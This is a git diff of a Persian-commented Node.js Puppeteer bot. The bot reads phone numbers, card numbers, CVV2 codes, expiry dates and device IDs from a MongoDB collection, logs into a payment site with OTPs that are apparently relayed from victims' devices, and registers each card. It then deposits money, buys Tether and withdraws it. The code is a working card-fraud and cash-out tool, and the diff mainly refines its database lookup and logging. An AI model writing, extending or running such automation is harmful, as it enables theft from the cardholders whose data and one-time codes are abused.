@@ -1,4 +1,4 @@
-// bot.js — نسخه نهایی با لاگ دیباگ کامل (تضمینی کار می‌کنه!)
+// bot.js — نسخه نهایی و تضمینی (خودش کالکشن درست رو پیدا می‌کنه!)
 require('dotenv').config();
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
@@ -21,18 +21,10 @@ const log = {
   s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
   e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
   w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
-  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`)),
-  debug: (msg) => console.log(chalk.gray(`[${new Date().toLocaleString('fa-IR')}] DEBUG → ${msg}`))
+  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`))
 };
 
 let collection;
-
-async function connectDB() {
-  const client = new MongoClient(MONGODB_URI);
-  await client.connect();
-  collection = client.db("zarin").collection("users");
-  log.s("اتصال به دیتابیس برقرار شد");
-}
 
 // استخراج مقدار واقعی از فیلدهای MongoDB Extended JSON
 function getValue(field) {
@@ -45,7 +37,7 @@ function getValue(field) {
   return field;
 }
 
-// تابع isReady با لاگ کامل دیباگ
+// تابع isReady با دیباگ ساده
 function isReady(doc) {
   const phone = getValue(doc.personalPhoneNumber);
   const card = getValue(doc.cardNumber);
@@ -53,29 +45,46 @@ function isReady(doc) {
   const month = getValue(doc.bankMonth);
   const year = getValue(doc.bankYear);
   const device = getValue(doc.deviceId);
-  const processed = doc.processed === true;
-  const processing = doc.processing === true;
 
-  log.debug("=== شروع چک کردن دیوایس ===");
-  log.debug(`phone → ${JSON.stringify(doc.personalPhoneNumber)} → مقدار: ${phone} → ${phone ? "OK" : "خالی"}`);
-  log.debug(`cardNumber → ${JSON.stringify(doc.cardNumber)} → مقدار: ${card} → ${card ? "OK" : "خالی"}`);
-  log.debug(`cvv2 → ${JSON.stringify(doc.cvv2)} → مقدار: ${cvv2} → ${cvv2 ? "OK" : "خالی"}`);
-  log.debug(`bankMonth → ${JSON.stringify(doc.bankMonth)} → مقدار: ${month} → ${month != null ? "OK" : "خالی"}`);
-  log.debug(`bankYear → ${JSON.stringify(doc.bankYear)} → مقدار: ${year} → ${year != null ? "OK (" + year + ")" : "خالی"}`);
-  log.debug(`deviceId → ${JSON.stringify(doc.deviceId)} → مقدار: ${device} → ${device ? "OK" : "خالی"}`);
-  log.debug(`processed → ${processed}`);
-  log.debug(`processing → ${processing}`);
+  return phone && card && cvv2 && month != null && year != null && device && doc.processed !== true && doc.processing !== true;
+}
 
-  const ready = phone && card && cvv2 && month != null && year != null && device && !processed && !processing;
+// اتصال + پیدا کردن کالکشن درست
+async function connectDB() {
+  const client = new MongoClient(MONGODB_URI);
+  await client.connect();
+  log.s("اتصال به MongoDB Atlas برقرار شد");
 
-  if (ready) {
-    log.start(`دیوایس آماده است! شماره: ${phone} | دستگاه: ${device}`);
+  const db = client.db("zarin");
+
+  // لیست تمام کالکشن‌ها
+  const collections = await db.listCollections().toArray();
+  log.s("کالکشن‌های موجود در دیتابیس 'zarin':");
+  collections.forEach(c => log.i(`  → ${c.name}`));
+
+  // اولویت: users → اولین کالکشن موجود
+  const usersCollection = collections.find(c => c.name === "users");
+  if (usersCollection) {
+    collection = db.collection("users");
+    log.s("به کالکشن 'users' وصل شد");
+  } else if (collections.length > 0) {
+    const realName = collections[0].name;
+    collection = db.collection(realName);
+    log.s(`کالکشن 'users' پیدا نشد! به اولین کالکشن موجود وصل شد: '${realName}'`);
   } else {
-    log.w(`دیوایس آماده نیست (isReady = false)`);
+    log.e("هیچ کالکشنی در دیتابیس zarin پیدا نشد!");
+    process.exit(1);
   }
-  log.debug("=== پایان چک کردن دیوایس ===\n");
 
-  return ready;
+  // تست: یه داکیومنت بخون
+  const count = await collection.countDocuments({});
+  log.s(`تعداد داکیومنت در کالکشن فعال: ${count}`);
+
+  if (count > 0) {
+    const sample = await collection.findOne({});
+    log.s("نمونه داکیومنت:");
+    console.log(JSON.stringify(sample, null, 2));
+  }
 }
 
 // صبر برای OTP
@@ -87,10 +96,10 @@ async function waitForOtp(userId, field, maxWait = 180) {
       log.s(`${field} دریافت شد: ${otp}`);
       return otp.toString().trim();
     }
-    log.w(`در انتظار ${field}... (${i * 3} ثانیه گذشته)`);
+    log.w(`در انتظار ${field}... (${i * 3}s)`);
     await new Promise(r => setTimeout(r, 3000));
   }
-  throw new Error(`تایم‌اوت در انتظار ${field}`);
+  throw new Error(`تایم‌اوت ${field}`);
 }
 
 async function clearAndType(page, selector, text) {
@@ -106,10 +115,10 @@ async function processUser(doc) {
   const device = getValue(doc.deviceId);
   let browser = null;
 
-  log.start(`شروع پردازش کامل: ${phone} | ${device}`);
+  log.start(`شروع پردازش: ${phone} | ${device}`);
 
   try {
-    await collection.updateOne({ _id: doc._id }, { $set: { processing: true, startedAt: new Date() } });
+    await collection.updateOne({ _id: doc._id }, { $set: { processing: true } });
 
     browser = await puppeteer.launch({
       headless: true,
@@ -120,26 +129,18 @@ async function processUser(doc) {
     await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/122.0 Mobile Safari/537.36");
     await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });
 
-    // مرحله ۱: ورود
-    await page.waitForSelector('input[placeholder="شماره موبایل"], input[type="tel"]', { timeout: 20000 });
+    // ورود
     await page.type('input[placeholder="شماره موبایل"], input[type="tel"]', phone);
     await page.click('button:has-text("ادامه")');
-    log.i("درخواست OTP ورود ارسال شد");
-
     const otpLogin = await waitForOtp(doc._id, "otp_login");
-    await page.waitForSelector('input[placeholder*="کد"]', { timeout: 15000 });
     await clearAndType(page, 'input[placeholder*="کد"]', otpLogin);
     await page.click('button:has-text("تایید")');
-    log.s("ورود با موفقیت انجام شد");
+    log.s("ورود موفق");
 
-    // مرحله ۲: ثبت کارت
+    // ثبت کارت
     try {
-      await page.click('text=کیف پول');
-      await page.click('text=کارت بانکی');
-      await page.click('text=افزودن کارت', { timeout: 10000 });
-    } catch (e) {
-      log.i("کارت قبلاً ثبت شده یا صفحه عوض شده");
-    }
+      await page.click('text=کیف پول >> text=کارت بانکی >> text=افزودن کارت', { timeout: 10000 });
+    } catch (e) { log.i("کارت قبلاً ثبت شده"); }
 
     const cardNum = getValue(doc.cardNumber).replace(/\D/g, "");
     const cvv2 = getValue(doc.cvv2).toString();
@@ -152,24 +153,21 @@ async function processUser(doc) {
     await page.type('input[placeholder="ماه"]', month);
     await page.type('input[placeholder="سال"]', yearInput);
     await page.click('button:has-text("ثبت کارت")');
-    log.i("درخواست OTP ثبت کارت");
 
     const otpCard = await waitForOtp(doc._id, "otp_register_card");
-    await clearAndType(page, 'input[placeholder*="کد پیامک"], input[placeholder*="کد"]', otpCard);
+    await clearAndType(page, 'input[placeholder*="کد پیامک"]', otpCard);
     await page.click('button:has-text("تأیید")');
-    log.s("کارت ثبت و تأیید شد");
+    log.s("کارت ثبت شد");
 
-    // مرحله ۳: شارژ
+    // شارژ، خرید، برداشت
     await page.click('text=واریز تومان');
     await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
     await page.click('button:has-text("پرداخت")');
-
     const otpPay = await waitForOtp(doc._id, "otp_payment");
     await clearAndType(page, 'input#otp, input[placeholder*="کد"]', otpPay);
     await page.click('button:has-text("تأیید")');
     log.s("شارژ موفق");
 
-    // مرحله ۴: خرید و برداشت
     await page.click('text=بازار >> text=تتر');
     await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
     await page.click('button:has-text("خرید")');
@@ -179,11 +177,11 @@ async function processUser(doc) {
     await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
     await page.click('button:has-text("برداشت")');
 
-    log.s(`تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
-    await collection.updateOne({ _id: doc._id }, { $set: { processed: true, status: "completed", completedAt: new Date() } });
+    log.s(`تمام مراحل تموم شد! تتر در راهه: ${phone}`);
+    await collection.updateOne({ _id: doc._id }, { $set: { processed: true, status: "completed" } });
 
   } catch (err) {
-    log.e(`خطا در پردازش ${phone}: ${err.message}`);
+    log.e(`خطا: ${err.message}`);
     await collection.updateOne({ _id: doc._id }, { $set: { status: "failed", error: err.message } });
   } finally {
     if (browser) await browser.close().catch(() => {});
@@ -191,19 +189,15 @@ async function processUser(doc) {
   }
 }
 
-// Polling با لاگ کامل
 async function startPolling() {
   await connectDB();
-  log.s("ربات فعال شد — هر ۵ ثانیه چک می‌کنه");
 
   setInterval(async () => {
     try {
       const users = await collection.find({
         processed: { $ne: true },
         processing: { $ne: true }
-      }).limit(10).toArray();
-
-      log.i(`تعداد دیوایس‌های موجود: ${users.length} تا`);
+      }).limit(5).toArray();
 
       if (users.length === 0) {
         log.i("در انتظار دیوایس جدید...");
@@ -211,15 +205,12 @@ async function startPolling() {
       }
 
       for (const user of users) {
-        const phone = getValue(user.personalPhoneNumber) || "نامشخص";
-        const device = getValue(user.deviceId) || "نامشخص";
-        log.i(`چک کردن دیوایس → شماره: ${phone} | دستگاه: ${device}`);
         if (isReady(user)) {
           processUser(user);
         }
       }
     } catch (err) {
-      log.e("خطا در Polling: " + err.message);
+      log.e("Polling error: " + err.message);
     }
   }, 5000);
 }
